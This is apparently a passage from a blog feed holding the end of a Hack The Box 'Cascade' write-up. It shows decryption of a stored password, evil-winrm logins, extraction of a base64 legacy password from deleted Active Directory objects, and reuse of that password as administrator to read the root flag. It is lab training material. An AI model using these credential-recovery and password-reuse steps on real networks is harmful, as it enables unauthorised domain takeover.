+&lt;span class="code-line"&gt;  aes.IV = Encoding.UTF8.GetBytes(&amp;quot;1tdyjCbY1Ix49842&amp;quot;);&lt;/span&gt;
+&lt;span class="code-line"&gt;  aes.Mode = CipherMode.CBC;&lt;/span&gt;
+&lt;span class="code-line"&gt;  aes.Key = Encoding.UTF8.GetBytes(Key);&lt;/span&gt;
+&lt;span class="code-line"&gt;  string @string;&lt;/span&gt;
+&lt;span class="code-line"&gt;  using (MemoryStream memoryStream = new MemoryStream(array))&lt;/span&gt;
+&lt;span class="code-line"&gt;  {&lt;/span&gt;
+&lt;span class="code-line"&gt;    using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateDecryptor(), CryptoStreamMode.Read))&lt;/span&gt;
+&lt;span class="code-line"&gt;    {&lt;/span&gt;
+&lt;span class="code-line"&gt;      byte[] array2 = new byte[checked(array.Length - 1 + 1)];&lt;/span&gt;
+&lt;span class="code-line"&gt;      cryptoStream.Read(array2, 0, array2.Length);&lt;/span&gt;
+&lt;span class="code-line"&gt;      @string = Encoding.UTF8.GetString(array2);&lt;/span&gt;
+&lt;span class="code-line"&gt;    }&lt;/span&gt;
+&lt;span class="code-line"&gt;  }&lt;/span&gt;
+&lt;span class="code-line"&gt;  return @string;&lt;/span&gt;
+&lt;span class="code-line"&gt;}&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Here is the &lt;a href="https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)AES_Decrypt(%7B'option':'UTF8','string':'c4scadek3y654321'%7D,%7B'option':'UTF8','string':'1tdyjCbY1Ix49842'%7D,'CBC','Raw','Raw',%7B'option':'Hex','string':''%7D)&amp;input=QlFPNWw1S2o5TWRFclh4NlE2QUdPdz09"&gt;CyberChef recipe&lt;/a&gt; to decode the password: &lt;code&gt;w3lc0meFr31nd&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;From there we can can connect with the &lt;code&gt;ArkSvc&lt;/code&gt; account using
+&lt;a href="https://github.com/Hackplayers/evil-winrm"&gt;evil-winrm&lt;/a&gt; and enumerate our
+permissions.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~/tools/github/evil-winrm$ ruby ./evil-winrm.rb -i 10.10.10.182 -u ArkSvc -p w3lc0meFr31nd&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Evil-WinRM shell v1.8&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Info: Establishing connection to remote endpoint&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;*Evil-WinRM* PS C:\Users\arksvc\Documents&amp;gt; whoami /all&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;USER INFORMATION&lt;/span&gt;
+&lt;span class="code-line"&gt;----------------&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;User Name      SID&lt;/span&gt;
+&lt;span class="code-line"&gt;============== ==============================================&lt;/span&gt;
+&lt;span class="code-line"&gt;cascade\arksvc S-1-5-21-3332504370-1206983947-1165150453-1106&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;GROUP INFORMATION&lt;/span&gt;
+&lt;span class="code-line"&gt;-----------------&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Group Name&lt;/span&gt;
+&lt;span class="code-line"&gt;===========================================&lt;/span&gt;
+&lt;span class="code-line"&gt;Everyone&lt;/span&gt;
+&lt;span class="code-line"&gt;BUILTIN\Users&lt;/span&gt;
+&lt;span class="code-line"&gt;BUILTIN\Pre-Windows 2000 Compatible Access&lt;/span&gt;
+&lt;span class="code-line"&gt;NT AUTHORITY\NETWORK&lt;/span&gt;
+&lt;span class="code-line"&gt;NT AUTHORITY\Authenticated Users&lt;/span&gt;
+&lt;span class="code-line"&gt;NT AUTHORITY\This Organization&lt;/span&gt;
+&lt;span class="code-line"&gt;CASCADE\Data Share&lt;/span&gt;
+&lt;span class="code-line"&gt;CASCADE\IT&lt;/span&gt;
+&lt;span class="code-line"&gt;CASCADE\AD Recycle Bin&lt;/span&gt;
+&lt;span class="code-line"&gt;CASCADE\Remote Management Users&lt;/span&gt;
+&lt;span class="code-line"&gt;NT AUTHORITY\NTLM Authentication&lt;/span&gt;
+&lt;span class="code-line"&gt;Mandatory Label\Medium Plus Mandatory Level&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;PRIVILEGES INFORMATION&lt;/span&gt;
+&lt;span class="code-line"&gt;----------------------&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Privilege Name                Description                    State&lt;/span&gt;
+&lt;span class="code-line"&gt;============================= ============================== =======&lt;/span&gt;
+&lt;span class="code-line"&gt;SeMachineAccountPrivilege     Add workstations to domain     Enabled&lt;/span&gt;
+&lt;span class="code-line"&gt;SeChangeNotifyPrivilege       Bypass traverse checking       Enabled&lt;/span&gt;
+&lt;span class="code-line"&gt;SeIncreaseWorkingSetPrivilege Increase a process working set Enabled&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We are in the group &lt;code&gt;AD Recycle Bin&lt;/code&gt;. A few Google research lead us to
+&lt;a href="https://docs.microsoft.com/en-us/archive/blogs/askds/the-ad-recycle-bin-understanding-implementing-best-practices-and-troubleshooting"&gt;a Microsoft article about AD recycle bin&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;We execute the Powershell command to list the deleted objects and see some
+&lt;code&gt;cascadeLegacyPwd&lt;/code&gt; filed for the user &lt;code&gt;TempAdmin&lt;/code&gt;.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;*Evil-WinRM* PS C:\Users\arksvc\Desktop&amp;gt;  Get-ADObject -filter &amp;#39;isdeleted -eq $true -and name -ne &amp;quot;Deleted Objects&amp;quot;&amp;#39; -includeDeletedObjects -property *&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;CanonicalName                   : cascade.local/Deleted Objects/User&lt;/span&gt;
+&lt;span class="code-line"&gt;                                  DEL:746385f2-e3a0-4252-b83a-5a206da0ed88&lt;/span&gt;
+&lt;span class="code-line"&gt;CN                              : User&lt;/span&gt;
+&lt;span class="code-line"&gt;                                  DEL:746385f2-e3a0-4252-b83a-5a206da0ed88&lt;/span&gt;
+&lt;span class="code-line"&gt;Created                         : 1/26/2020 2:34:31 AM&lt;/span&gt;
+&lt;span class="code-line"&gt;createTimeStamp                 : 1/26/2020 2:34:31 AM&lt;/span&gt;
+&lt;span class="code-line"&gt;Deleted                         : True&lt;/span&gt;
+&lt;span class="code-line"&gt;Description                     :&lt;/span&gt;
+&lt;span class="code-line"&gt;DisplayName                     :&lt;/span&gt;
+&lt;span class="code-line"&gt;DistinguishedName               : CN=User\0ADEL:746385f2-e3a0-4252-b83a-5a206da0ed88,CN=Deleted Objects,DC=cascade,DC=local&lt;/span&gt;
+&lt;span class="code-line"&gt;dSCorePropagationData           : {1/1/1601 12:00:00 AM}&lt;/span&gt;
+&lt;span class="code-line"&gt;instanceType                    : 4&lt;/span&gt;
+&lt;span class="code-line"&gt;isDeleted                       : True&lt;/span&gt;
+&lt;span class="code-line"&gt;LastKnownParent                 : CN={A403B701-A528-4685-A816-FDEE32BDDCBA}\0ADEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e,CN=Deleted Objects,DC=cascade,DC=local&lt;/span&gt;
+&lt;span class="code-line"&gt;Modified                        : 1/26/2020 2:40:52 AM&lt;/span&gt;
+&lt;span class="code-line"&gt;modifyTimeStamp                 : 1/26/2020 2:40:52 AM&lt;/span&gt;
+&lt;span class="code-line"&gt;msDS-LastKnownRDN               : User&lt;/span&gt;
+&lt;span class="code-line"&gt;Name                            : User&lt;/span&gt;
+&lt;span class="code-line"&gt;                                  DEL:746385f2-e3a0-4252-b83a-5a206da0ed88&lt;/span&gt;
+&lt;span class="code-line"&gt;nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity&lt;/span&gt;
+&lt;span class="code-line"&gt;ObjectCategory                  :&lt;/span&gt;
+&lt;span class="code-line"&gt;ObjectClass                     : container&lt;/span&gt;
+&lt;span class="code-line"&gt;ObjectGUID                      : 746385f2-e3a0-4252-b83a-5a206da0ed88&lt;/span&gt;
+&lt;span class="code-line"&gt;ProtectedFromAccidentalDeletion : False&lt;/span&gt;
+&lt;span class="code-line"&gt;sDRightsEffective               : 0&lt;/span&gt;
+&lt;span class="code-line"&gt;showInAdvancedViewOnly          : True&lt;/span&gt;
+&lt;span class="code-line"&gt;uSNChanged                      : 196700&lt;/span&gt;
+&lt;span class="code-line"&gt;uSNCreated                      : 196690&lt;/span&gt;
+&lt;span class="code-line"&gt;whenChanged                     : 1/26/2020 2:40:52 AM&lt;/span&gt;
+&lt;span class="code-line"&gt;whenCreated                     : 1/26/2020 2:34:31 AM&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;accountExpires                  : 9223372036854775807&lt;/span&gt;
+&lt;span class="code-line"&gt;badPasswordTime                 : 0&lt;/span&gt;
+&lt;span class="code-line"&gt;badPwdCount                     : 0&lt;/span&gt;
+&lt;span class="code-line"&gt;CanonicalName                   : cascade.local/Deleted Objects/TempAdmin&lt;/span&gt;
+&lt;span class="code-line"&gt;                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059&lt;/span&gt;
+&lt;span class="code-line"&gt;cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz&lt;/span&gt;
+&lt;span class="code-line"&gt;CN                              : TempAdmin&lt;/span&gt;
+&lt;span class="code-line"&gt;                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059&lt;/span&gt;
+&lt;span class="code-line"&gt;codePage                        : 0&lt;/span&gt;
+&lt;span class="code-line"&gt;countryCode                     : 0&lt;/span&gt;
+&lt;span class="code-line"&gt;Created                         : 1/27/2020 3:23:08 AM&lt;/span&gt;
+&lt;span class="code-line"&gt;createTimeStamp                 : 1/27/2020 3:23:08 AM&lt;/span&gt;
+&lt;span class="code-line"&gt;Deleted                         : True&lt;/span&gt;
+&lt;span class="code-line"&gt;Description                     :&lt;/span&gt;
+&lt;span class="code-line"&gt;DisplayName                     : TempAdmin&lt;/span&gt;
+&lt;span class="code-line"&gt;DistinguishedName               : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local&lt;/span&gt;
+&lt;span class="code-line"&gt;dSCorePropagationData           : {1/27/2020 3:23:08 AM, 1/1/1601 12:00:00 AM}&lt;/span&gt;
+&lt;span class="code-line"&gt;givenName                       : TempAdmin&lt;/span&gt;
+&lt;span class="code-line"&gt;instanceType                    : 4&lt;/span&gt;
+&lt;span class="code-line"&gt;isDeleted                       : True&lt;/span&gt;
+&lt;span class="code-line"&gt;LastKnownParent                 : OU=Users,OU=UK,DC=cascade,DC=local&lt;/span&gt;
+&lt;span class="code-line"&gt;lastLogoff                      : 0&lt;/span&gt;
+&lt;span class="code-line"&gt;lastLogon                       : 0&lt;/span&gt;
+&lt;span class="code-line"&gt;logonCount                      : 0&lt;/span&gt;
+&lt;span class="code-line"&gt;Modified                        : 1/27/2020 3:24:34 AM&lt;/span&gt;
+&lt;span class="code-line"&gt;modifyTimeStamp                 : 1/27/2020 3:24:34 AM&lt;/span&gt;
+&lt;span class="code-line"&gt;msDS-LastKnownRDN               : TempAdmin&lt;/span&gt;
+&lt;span class="code-line"&gt;Name                            : TempAdmin&lt;/span&gt;
+&lt;span class="code-line"&gt;                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059&lt;/span&gt;
+&lt;span class="code-line"&gt;nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity&lt;/span&gt;
+&lt;span class="code-line"&gt;ObjectCategory                  :&lt;/span&gt;
+&lt;span class="code-line"&gt;ObjectClass                     : user&lt;/span&gt;
+&lt;span class="code-line"&gt;ObjectGUID                      : f0cc344d-31e0-4866-bceb-a842791ca059&lt;/span&gt;
+&lt;span class="code-line"&gt;objectSid                       : S-1-5-21-3332504370-1206983947-1165150453-1136&lt;/span&gt;
+&lt;span class="code-line"&gt;primaryGroupID                  : 513&lt;/span&gt;
+&lt;span class="code-line"&gt;ProtectedFromAccidentalDeletion : False&lt;/span&gt;
+&lt;span class="code-line"&gt;pwdLastSet                      : 132245689883479503&lt;/span&gt;
+&lt;span class="code-line"&gt;sAMAccountName                  : TempAdmin&lt;/span&gt;
+&lt;span class="code-line"&gt;sDRightsEffective               : 0&lt;/span&gt;
+&lt;span class="code-line"&gt;userAccountControl              : 66048&lt;/span&gt;
+&lt;span class="code-line"&gt;userPrincipalName               : TempAdmin@cascade.local&lt;/span&gt;
+&lt;span class="code-line"&gt;uSNChanged                      : 237705&lt;/span&gt;
+&lt;span class="code-line"&gt;uSNCreated                      : 237695&lt;/span&gt;
+&lt;span class="code-line"&gt;whenChanged                     : 1/27/2020 3:24:34 AM&lt;/span&gt;
+&lt;span class="code-line"&gt;whenCreated                     : 1/27/2020 3:23:08 AM&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We decode the base64 filed and found some password.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~$ echo -ne &amp;#39;YmFDVDNyMWFOMDBkbGVz&amp;#39; | base64 -d&lt;/span&gt;
+&lt;span class="code-line"&gt;baCT3r1aN00dles&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;My first idea was to restore the object but it seems that this is not possible.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;*Evil-WinRM* PS C:\Users\arksvc\Documents&amp;gt;  Get-ADObject -Filter &amp;#39;samaccountname -eq &amp;quot;TempAdmin&amp;quot;&amp;#39; -IncludeDeletedObjects | Restore-ADObject&lt;/span&gt;
+&lt;span class="code-line"&gt;Insufficient access rights to perform the operation&lt;/span&gt;
+&lt;span class="code-line"&gt;At line:1 char:81&lt;/span&gt;
+&lt;span class="code-line"&gt;+ ... ccountname -eq &amp;quot;TempAdmin&amp;quot;&amp;#39; -IncludeDeletedObjects | Restore-ADObject&lt;/span&gt;
+&lt;span class="code-line"&gt;+                                                          ~~~~~~~~~~~~~~~~&lt;/span&gt;
+&lt;span class="code-line"&gt;    + CategoryInfo          : InvalidOperation: (CN=TempAdmin\0A...ascade,DC=local:ADObject) [Restore-ADObject], ADException&lt;/span&gt;
+&lt;span class="code-line"&gt;    + FullyQualifiedErrorId : 0,Microsoft.ActiveDirectory.Management.Commands.RestoreADObject&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Therefore I just tried to connect as &lt;code&gt;administrator&lt;/code&gt; hoping for password reuse,
+it worked and I was able to get the root flag..&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~/tools/github/evil-winrm$ ruby ./evil-winrm.rb -i 10.10.10.182 -u administrator -pbaCT3r1aN00dles&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Evil-WinRM shell v1.8&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Info: Establishing connection to remote endpoint&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;*Evil-WinRM* PS C:\Users\Administrator\Documents&amp;gt; type ../Desktop/root.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;86e93219a4f189663d558122a087a4c3&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h2 id="wrapping-up"&gt;Wrapping up&lt;/h2&gt;
+&lt;p&gt;This box was fun as there was a lot of different stuff and everything went
+smoothly. The only painful part is the dig into the &lt;code&gt;ldapsearch&lt;/code&gt; results as the
+file is quit long (6 363 lines).&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="Windows"></category><category term="LDAP"></category><category term="VNC"></category><category term="AD Recycle bin"></category></entry><entry><title>HTB: Sauna</title><link href="https://maggick.fr/2020/07/htb-sauna.html" rel="alternate"></link><published>2020-07-22T09:35:00+02:00</published><updated>2020-07-22T09:35:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-07-22:/2020/07/htb-sauna.html</id><summary type="html">&lt;p&gt;&lt;img alt="Craft card" class="align-left" src="/media/2020.07/sauna_card.png" width="262"/&gt;&lt;/p&gt;
 &lt;p&gt;This is a writeup about a retired HacktheBox machine:
 &lt;a href="https://www.hackthebox.eu/home/machines/profile/229"&gt;Sauna&lt;/a&gt; published on
 February the 15th 2020 by
